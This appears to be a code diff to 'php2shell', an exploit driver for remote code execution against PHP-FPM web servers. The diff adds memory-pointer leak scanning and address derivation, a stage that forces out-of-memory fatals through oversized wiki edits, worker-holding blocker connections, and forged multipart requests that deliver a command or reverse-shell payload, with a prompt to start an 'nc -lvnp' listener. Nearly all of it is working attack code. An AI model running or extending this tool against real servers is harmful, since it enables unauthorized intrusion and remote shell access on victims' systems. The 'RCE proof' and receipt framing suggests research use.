@@ -1,17 +1,26 @@
 #!/usr/bin/env python3
-"""php2shell chain driver (--step recon | chain).
+"""php2shell chain driver (--step recon | chain | produce).
 
 recon:   pre-flight fingerprint (tool/stages/probe.py) + stock arm + leak
          probe + address derivation; machines stay unmodified, receipt only.
 chain:   blocker-hold + per-DSO-candidate attempt loop (rearm + final forged
          multipart = the controlled copy stage, executed via the reconstructed
-         COMPACT module tool/modules/compact-stock-tail.py).
+         COMPACT module tool/modules/compact-stock-tail.py). Address
+         derivation is best-effort (--strict-derive restores the exact
+         14-byte-only check); a probe response without any derivable
+         disclosure falls through to a plain-response receipt and the forged
+         write stays gated on a derived address (hard-required).
+produce: FPM producer stage (tool/stages/produce.py): the receipted anon-edit
+         OOM producer (edit) or the inert staged 618/619 shapes over the
+         receipted paced transport. Also orderable before the chain attempt
+         loop with --with-producer.
 
 Target registration and per-build binary profiles: tool/modules/profiles.py.
 
-Not implemented (chain stage producer): producers from
-tool/modules/producer.py are not wired into a CLI step yet.
-Not implemented (chain stage targets): TARGETS["modphp"].
+Not implemented (chain stage producer): producers are wired as a stage
+(--step produce / --with-producer), but only the receipted shapes; a live
+forged call target for the staged producers stays call=0 (inert).
+TODO (missing module): mod_php SAPI producer and modphp target constants.
 
 Entry points: ./tool/php2shell.py, ./tool/run, python -m tool
 """
@@ -22,6 +31,7 @@ import importlib.util
 import json
 import re
 import socket
+import struct
 import sys
 import time
 from pathlib import Path
@@ -33,6 +43,7 @@ sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports
 
 from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
 from tool.stages import probe as probe_stage  # noqa: E402
+from tool.stages import produce as produce_stage  # noqa: E402
 
 
 def load(name: str, path: Path):
@@ -154,16 +165,112 @@ def record(output: Path, label: str, request: bytes, result, error: str | None =
     return item
 
 
-def derive(body: bytes, submitted: list[bytes]) -> dict:
+# Frozen-profile disclosure windows are canonical userspace pointers whose
+# low bits land exactly on the profile leak offset (analyze() rules); the
+# plain-text SAPI flavors print the same pointer as ASCII hex.
+CANONICAL_MIN = 0x0000700000000000
+CANONICAL_MAX = 0x00007FFFFFFFFFFF
+HEX_TEXT_PTR = re.compile(rb"0[xX]([0-9a-fA-F]{6,16})")
+HEX_TEXT_BARE = re.compile(rb"(?<![xX0-9a-fA-F])([0-9a-fA-F]{14,16})(?![0-9a-fA-F])")
+
+
+def _scan_pointer(body: bytes, submitted: list[bytes]):
+    """Slide an 8-byte LE pointer window across a noisy response body.
+
+    Keep the analyze() candidate rules: canonical pointer range, pointer
+    landing on the profile leak offset inside its main chunk, and the
+    8 pointer bytes absent from the submitted requests (attacker-echoed
+    spray bytes are not a leak). Returns (offset, pointer) or None.
+    """
+    mask = LEAK.MAIN_CHUNK_SIZE - 1
+    leak_offset = PROFILE["leak_offset"]
+    for offset in range(0, max(0, len(body) - 7)):
+        pointer = struct.unpack_from("<Q", body, offset)[0]
+        if not CANONICAL_MIN <= pointer <= CANONICAL_MAX:
+            continue
+        if pointer & mask != leak_offset:
+            continue
+        pointer_bytes = body[offset:offset + 8]
+        if any(pointer_bytes in request for request in submitted):
+            continue
+        return offset, pointer
+    return None
+
+
+def _scan_pointer_hex(body: bytes):
+    """Disclosure printed as plain/SAPI text: ASCII hex of the same pointer."""
+    mask = LEAK.MAIN_CHUNK_SIZE - 1
+    leak_offset = PROFILE["leak_offset"]
+    for pattern in (HEX_TEXT_PTR, HEX_TEXT_BARE):
+        for match in pattern.finditer(body):
+            pointer = int(match.group(1), 16)
+            if CANONICAL_MIN <= pointer <= CANONICAL_MAX and pointer & mask == leak_offset:
+                return match.start(), pointer
+    return None
+
+
+def derive(body: bytes, submitted: list[bytes], strict: bool = False) -> dict:
+    """Best-effort frozen-profile address derivation from a probe response.
+
+    The previous exact check (``len(body) != 14 or not candidate`` ->
+    ValueError) broke the final chain whenever the same disclosure is
+    emitted inside a noisy, plain/SAPI-flavored response. The default path
+    is now layered:
+
+      1. ``exact-14``    — body == 14 bytes, LEAK.analyze candidate (the
+                           original math, unchanged);
+      2. ``scan@<off>``  — 8-byte little-endian pointer window slid across
+                           the body (canonical range, ``pointer & 0x1FFFFF ==
+                           leak_offset``, bytes not attacker-echoed — the
+                           analyze() rules), tolerating prefix/suffix noise;
+      3. ``hex-text@off``— the same pointer printed as ASCII hex with/without
+                           the ``0x`` prefix, any case (plain-text SAPI flavor
+                           of the disclosure); a bare 14-16 digit hex string is
+                           specific enough to disambiguate.
+
+    Every hit keeps mode/hit_offset/hit_bytes in the result so receipts
+    still prove the outcome. With no hit at all the result is a
+    ``"plain-response"`` derivation stub (body analysis kept, no addresses);
+    the chain treats it as "no derivable disclosure" instead of aborting the
+    ordered stages — the forged write stays hard-gated on a derived address.
+    ``strict=True`` reproduces the old raising behavior verbatim
+    (--strict-derive) for reproducible receipts.
+    """
     disclosure = LEAK.analyze(body, submitted)
-    if len(body) != 14 or not disclosure.get("candidate"):
-        raise ValueError("response is not the exact 14-byte frozen-profile disclosure")
-    main = int(disclosure["main_chunk"], 16)
+    if strict or (len(body) == 14 and disclosure.get("candidate")):
+        if strict and (len(body) != 14 or not disclosure.get("candidate")):
+            raise ValueError("response is not the exact 14-byte frozen-profile disclosure")
+        mode = "exact-14"
+        hit_offset = 0
+        hit_bytes = body[:8].hex()
+        pointer = int(disclosure["pointer"], 16)
+    else:
+        scan = _scan_pointer(body, submitted)
+        kind = "scan"
+        if scan is None:
+            scan = _scan_pointer_hex(body)
+            kind = "hex-text"
+        if scan is None:
+            return {
+                "disclosure": disclosure,
+                "mode": "plain-response",
+                "derivation": None,
+                "hit_offset": None,
+                "hit_bytes": None,
+            }
+        hit_offset, pointer = scan
+        hit_bytes = body[hit_offset:hit_offset + 8].hex()
+        mode = f"{kind}@{hit_offset}"
+    main = pointer & ~(LEAK.MAIN_CHUNK_SIZE - 1)
     target = main + PROFILE["target_offset"]
     stage = main + PROFILE["stage_offset"]
     candidates = [main - delta for delta in PROFILE["dso_deltas"]]
     return {
         "disclosure": disclosure,
+        "mode": mode,
+        "hit_offset": hit_offset,
+        "hit_bytes": hit_bytes,
+        "pointer": f"0x{pointer:x}",
         "main": f"0x{main:x}",
         "target": f"0x{target:x}",
         "stage": f"0x{stage:x}",
@@ -197,6 +304,7 @@ def attempt(
     ordinal: int,
     output: Path,
     payload: str,
+    strict: bool = False,
 ) -> dict:
     output.mkdir(parents=True, exist_ok=True)
     native_arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
@@ -210,15 +318,21 @@ def attempt(
     probe_body = LEAK.probe_body()
     probe_request = LEAK.request_bytes(host_header, path, probe_body, b"", 64, True)
     positive = None
+    address = None
+    rearm_request = None
+    rearm_result = None
+    forged = False
     try:
         positive, positive_stream, probe_result = open_exchange(
             host, port, probe_request, timeout
         )
-        address = derive(probe_result[1], [native_arm_request, probe_request])
-        main = int(address["main"], 16)
-        target = int(address["target"], 16)
-        stage_delta = int(address["stage_delta"], 16)
-        dso_base = main - PROFILE["dso_deltas"][ordinal]
+        address = derive(probe_result[1], [native_arm_request, probe_request], strict)
+        # plain-response fallback: no derivable disclosure in this probe
+        # exchange -> the ordered stages continue for the receipt, but the
+        # forged write below stays gated on a derived address (hard-required:
+        # the write would copy an attacker-chosen pointer over an unverified
+        # base otherwise).
+        forged = address.get("mode") != "plain-response"
 
         rearm_body = COMPACT.arm_body(False, COMPACT.ARM_FILENAME_LENGTH, 149)
         rearm_request = multipart_request(
@@ -235,33 +349,44 @@ def attempt(
         if positive is not None:
             positive.close()
 
-    final_body = COMPACT.probe_body(
-        100,
-        39,
-        39,
-        11,
-        True,
-        2,
-        8000,
-        6000,
-        False,
-        True,
-        target,
-        dso_base,
-        stage_delta,
-        1,
-        payload,
-    )
-    final_request = multipart_request(
-        host_header,
-        path,
-        f"rearm{ordinal}b".encode("ascii"),
-        COMPACT.BOUNDARY,
-        final_body,
-        False,
-    )
-    final_result, final_error = exchange(host, port, final_request, timeout)
-    match = ID_LINE.search(final_result[1])
+    final_request = None
+    final_result = None
+    final_error = None
+    dso_base = None
+    match = None
+    if forged:
+        main = int(address["main"], 16)
+        target = int(address["target"], 16)
+        stage_delta = int(address["stage_delta"], 16)
+        dso_base = main - PROFILE["dso_deltas"][ordinal]
+
+        final_body = COMPACT.probe_body(
+            100,
+            39,
+            39,
+            11,
+            True,
+            2,
+            8000,
+            6000,
+            False,
+            True,
+            target,
+            dso_base,
+            stage_delta,
+            1,
+            payload,
+        )
+        final_request = multipart_request(
+            host_header,
+            path,
+            f"rearm{ordinal}b".encode("ascii"),
+            COMPACT.BOUNDARY,
+            final_body,
+            False,
+        )
+        final_result, final_error = exchange(host, port, final_request, timeout)
+        match = ID_LINE.search(final_result[1])
 
     records = {
         "native_arm": record(
@@ -269,17 +394,29 @@ def attempt(
         ),
         "probe": record(output, "probe", probe_request, probe_result),
         "rearm": record(output, "rearm", rearm_request, rearm_result),
-        "final": record(output, "final", final_request, final_result, final_error),
+        "final": (
+            record(output, "final", final_request, final_result, final_error)
+            if final_request is not None
+            else {
+                "skipped": True,
+                "reason": (
+                    "plain-response fallback: no derivable frozen-profile "
+                    "disclosure in the probe exchange; the forged write is "
+                    "hard-required to carry a derived (main, target, dso) triple"
+                ),
+            }
+        ),
     }
     result = {
         "ordinal": ordinal,
         "dso_delta": f"0x{PROFILE['dso_deltas'][ordinal]:x}",
-        "selected_dso": f"0x{dso_base:x}",
+        "selected_dso": f"0x{dso_base:x}" if forged else None,
         "addresses": address,
+        "derivation_mode": address["mode"] if address else None,
         "records": records,
         "id_line": match.group(0).decode("ascii") if match else None,
         "success": bool(match),
-        "final_parts": 116,
+        "final_parts": 116 if forged else None,
     }
     rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
     (output / "result.json").write_text(rendered)
@@ -294,6 +431,7 @@ def run_recon(
     timeout: float,
     target_label: str,
     output: Path,
+    strict: bool = False,
 ) -> dict:
     """recon step: pre-flight fingerprint, stock arm, leak probe, addresses."""
     load_helpers()
@@ -334,7 +472,7 @@ def run_recon(
     addresses = None
     if probe_error is None:
         try:
-            addresses = derive(probe_result[1], [native_arm_request, probe_request])
+            addresses = derive(probe_result[1], [native_arm_request, probe_request], strict)
         except ValueError as error:
             addresses = {"error": str(error)}
     summary["addresses"] = addresses
@@ -346,9 +484,32 @@ def run_recon(
     return summary
 
 
+def resolve_producer(parser, args, target_name) -> str | None:
+    """Producer kind for --step produce / --with-producer (profile-bound)."""
+    kind = args.producer
+    entry = profiles.TARGETS.get(target_name or "", {}) if kind is None else {}
+    default = (entry.get("producer_step") or {}).get("default") if entry else None
+    if kind is None:
+        if default:
+            return default
+        parser.error(
+            "--producer is required (edit|618|619): this target has no "
+            "producer_step default in tool/modules/profiles.py (app-level "
+            "fatal producers are app-specific; see the registry TODOs)"
+        )
+    if kind not in ("edit", "618", "619"):
+        parser.error("--producer must be one of: edit, 618, 619")
+    known = profiles.TARGETS.get(target_name or "", {}).get("producer_step") or {}
+    note = (known.get("kinds") or {}).get(kind)
+    if isinstance(note, str) and note.startswith("TODO"):
+        parser.error(f"producer {kind!r} is not verified on target {target_name!r}: {note}")
+    return kind
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(
-        description="php2shell chain driver: --step recon (read-only receipt) or "
+        description="php2shell chain driver: --step recon (read-only receipt), "
+        "--step produce (receipted FPM producer stage) or "
         "--step chain (blocker-hold + rearm + forged staged multipart)"
     )
     parser.add_argument(
@@ -358,7 +519,7 @@ def main() -> int:
         "or an http:// URL for a one-off exchange (legacy usage)",
     )
     parser.add_argument("--url", default=None, help="explicit target URL override")
-    parser.add_argument("--step", required=True, choices=("recon", "chain"))
+    parser.add_argument("--step", required=True, choices=("recon", "chain", "produce"))
     parser.add_argument(
         "--profile",
         default=None,
@@ -368,6 +529,51 @@ def main() -> int:
     parser.add_argument("--command", default="id", help="chain command payload (default: id)")
     parser.add_argument("--lhost", default="127.0.0.1")
     parser.add_argument("--lport", default=4444, type=int)
+    parser.add_argument(
+        "--strict-derive",
+        action="store_true",
+        help="require the exact 14-byte frozen-profile disclosure again "
+        "(pre-scan behavior; reproducible receipts) instead of the "
+        "best-effort scan + plain-response fallback",
+    )
+    parser.add_argument(
+        "--producer",
+        default=None,
+        choices=("edit", "618", "619"),
+        help="producer kind for --step produce / --with-producer; "
+        "default comes from the target registry (wiki: edit)",
+    )
+    parser.add_argument(
+        "--producer-bytes",
+        default=produce_stage.PRODUCING_DEFAULT_BYTES,
+        type=int,
+        help="edit producer wpTextbox1 size (default: 6000000, receipted sweet spot)",
+    )
+    parser.add_argument(
+        "--producer-ladder-retries",
+        default=1,
+        type=int,
+        help="edit producer body-sized ladder retries on a no-fatal outcome "
+        "(one step of 1000000 bytes per retry, receipts 1M-9M)",
+    )
+    parser.add_argument(
+        "--producer-sid",
+        default=None,
+        help="session id for the staged 618/619 producers (default: derived stamp)",
+    )
+    parser.add_argument(
+        "--producer-stall",
+        default=1.35,
+        type=float,
+        help="staged 618/619 pacing stall between phase1 and tail "
+        "(default 1.35s, receipted sender recipe)",
+    )
+    parser.add_argument(
+        "--with-producer",
+        action="store_true",
+        help="run the producer stage before the chain attempt loop "
+        "(ordered stage; outcome recorded in the chain receipt)",
+    )
     parser.add_argument(
         "--output",
         type=Path,
@@ -418,6 +624,10 @@ def main() -> int:
         parser.error("recovery interval must be between 0 and 15 seconds")
     if not 1 <= args.lport <= 65535:
         parser.error("lport must be between 1 and 65535")
+    if not 0 <= args.producer_stall <= 15:
+        parser.error("producer stall must be between 0 and 15 seconds")
+    if args.producer_bytes < 1:
+        parser.error("producer bytes must be positive")
 
     if args.output is None:
         stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
@@ -437,74 +647,158 @@ def main() -> int:
         ).encode("ascii")
 
     if args.step == "recon":
-        result = run_recon(host, port, path, host_header, args.timeout, target_name or url, args.output)
+        result = run_recon(host, port, path, host_header, args.timeout,
+                           target_name or url, args.output, strict=args.strict_derive)
         summary = result
-    else:
-        blockers = []
-        attempts = []
-        try:
-            for _ in range(PROFILE["blockers"]):
-                connection = socket.create_connection((host, port), timeout=5)
-                connection.settimeout(args.timeout)
-                connection.sendall(hold)
-                blockers.append(connection)
-            time.sleep(args.settle_seconds)
-
-            for ordinal in range(len(PROFILE["dso_deltas"])):
-                try:
-                    result = attempt(
-                        host,
-                        port,
-                        path,
-                        host_header,
-                        args.timeout,
-                        ordinal,
-                        args.output / f"candidate-{ordinal}",
-                        payload,
-                    )
-                except (ConnectionError, OSError, TimeoutError, ValueError) as error:
-                    result = {
-                        "ordinal": ordinal,
-                        "success": False,
-                        "error": f"{type(error).__name__}: {error}",
-                    }
-                attempts.append(result)
-                if result.get("success"):
-                    break
-                time.sleep(args.recovery_seconds)
-        finally:
-            for connection in blockers:
-                connection.close()
-
-        success = next((item for item in attempts if item.get("success")), None)
-        summary = {
-            "step": "chain",
-            "profile": PROFILE,
-            "target": {"url": url, "host": host, "port": port, "path": path},
-            "command": args.command,
-            "lhost": args.lhost,
-            "lport": args.lport,
-            "payload": payload,
-            "blockers_opened": len(blockers),
-            "attempts": attempts,
-            "success": bool(success),
-            "id_line": success.get("id_line") if success else None,
-            "successful_candidate": success.get("ordinal") if success else None,
-        }
         rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
         (args.output / "result.json").write_text(rendered)
-        if success:
-            print(success["id_line"])
-        else:
-            print("RCE proof failed")
-        return 0 if success else 2
+        print(rendered, end="")
+        # recon exit code: 0 = worker responded with a parseable HTTP exchange;
+        # arm/probe field-level outcomes live in the receipt for human review.
+        return 0 if summary.get("preflight", {}).get("alive") else 2
 
+    if args.step == "produce":
+        load_helpers()  # produce reuses the measured stack constants via COMPACT
+        kind = resolve_producer(parser, args, target_name)
+        session_save_path = (
+            profiles.TARGETS.get(target_name, {}).get("session_save_path")
+            if target_name
+            else None
+        )
+        summary = produce_stage.run_producer(
+            kind,
+            host,
+            port,
+            path,
+            host_header,
+            args.timeout,
+            args.output,
+            label="producer",
+            text_bytes=args.producer_bytes,
+            ladder_retries=args.producer_ladder_retries,
+            sid=args.producer_sid,
+            stall=args.producer_stall,
+            session_save_path=session_save_path,
+        )
+        summary["step"] = "produce"
+        summary["profile"] = PROFILE["name"]
+        summary["target"] = {"url": url, "host": host, "port": port, "path": path}
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        (args.output / "result.json").write_text(rendered)
+        print(rendered, end="")
+        # produce exit code: 0 when the receipted producer outcome fired
+        # (edit: the app-level OOM fatal receipt; staged: a parseable reply
+        # and, for registered targets, the sess-record receipt).
+        if kind == "edit":
+            return 0 if summary.get("fatal") else 2
+        ok_reply = summary.get("status") is not None and not summary.get("error")
+        sess_ok = (summary.get("sess_record") or {}).get("bytes", 0) > 0
+        return 0 if ok_reply or sess_ok else 2
+
+    load_helpers()  # chain uses STOCK/COMPACT (previously missing here)
+    payload = command_mode(args.command, args.lhost, args.lport)
+    if args.command == "revshell":
+        print(f"[i] payload command: {payload}")
+        print(f"[i] start the listener first, e.g.: nc -lvnp {args.lport}")
+    hold = (
+        f"GET {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Connection: keep-alive\r\n"
+        "X-Hold: "
+    ).encode("ascii")
+
+    producer_summary = None
+    if args.with_producer:
+        # ordered producer stage before the attempt loop (option 1 of the
+        # producer wiring); the chain proceeds regardless of the producer
+        # outcome — the receipt records it for A/B (--with-producer on/off).
+        kind = resolve_producer(parser, args, target_name)
+        session_save_path = (
+            profiles.TARGETS.get(target_name, {}).get("session_save_path")
+            if target_name
+            else None
+        )
+        try:
+            producer_summary = produce_stage.run_producer(
+                kind,
+                host,
+                port,
+                path,
+                host_header,
+                args.timeout,
+                args.output / "chain-producer",
+                label="producer",
+                text_bytes=args.producer_bytes,
+                ladder_retries=args.producer_ladder_retries,
+                sid=args.producer_sid,
+                stall=args.producer_stall,
+                session_save_path=session_save_path,
+            )
+        except (OSError, TimeoutError, ValueError) as error:
+            producer_summary = {"error": f"{type(error).__name__}: {error}",
+                                "producer": kind}
+
+    blockers = []
+    attempts = []
+    try:
+        for _ in range(PROFILE["blockers"]):
+            connection = socket.create_connection((host, port), timeout=5)
+            connection.settimeout(args.timeout)
+            connection.sendall(hold)
+            blockers.append(connection)
+        time.sleep(args.settle_seconds)
+
+        for ordinal in range(len(PROFILE["dso_deltas"])):
+            try:
+                result = attempt(
+                    host,
+                    port,
+                    path,
+                    host_header,
+                    args.timeout,
+                    ordinal,
+                    args.output / f"candidate-{ordinal}",
+                    payload,
+                    strict=args.strict_derive,
+                )
+            except (ConnectionError, OSError, TimeoutError, ValueError) as error:
+                result = {
+                    "ordinal": ordinal,
+                    "success": False,
+                    "error": f"{type(error).__name__}: {error}",
+                }
+            attempts.append(result)
+            if result.get("success"):
+                break
+            time.sleep(args.recovery_seconds)
+    finally:
+        for connection in blockers:
+            connection.close()
+
+    success = next((item for item in attempts if item.get("success")), None)
+    summary = {
+        "step": "chain",
+        "profile": PROFILE,
+        "target": {"url": url, "host": host, "port": port, "path": path},
+        "command": args.command,
+        "lhost": args.lhost,
+        "lport": args.lport,
+        "payload": payload,
+        "with_producer": bool(args.with_producer),
+        "producer": producer_summary,
+        "blockers_opened": len(blockers),
+        "attempts": attempts,
+        "success": bool(success),
+        "id_line": success.get("id_line") if success else None,
+        "successful_candidate": success.get("ordinal") if success else None,
+    }
     rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
     (args.output / "result.json").write_text(rendered)
-    print(rendered, end="")
-    # recon exit code: 0 = worker responded with a parseable HTTP exchange;
-    # arm/probe field-level outcomes live in the receipt for human review.
-    return 0 if summary.get("preflight", {}).get("alive") else 2
+    if success:
+        print(success["id_line"])
+    else:
+        print("RCE proof failed")
+    return 0 if success else 2
 
 
 if __name__ == "__main__":
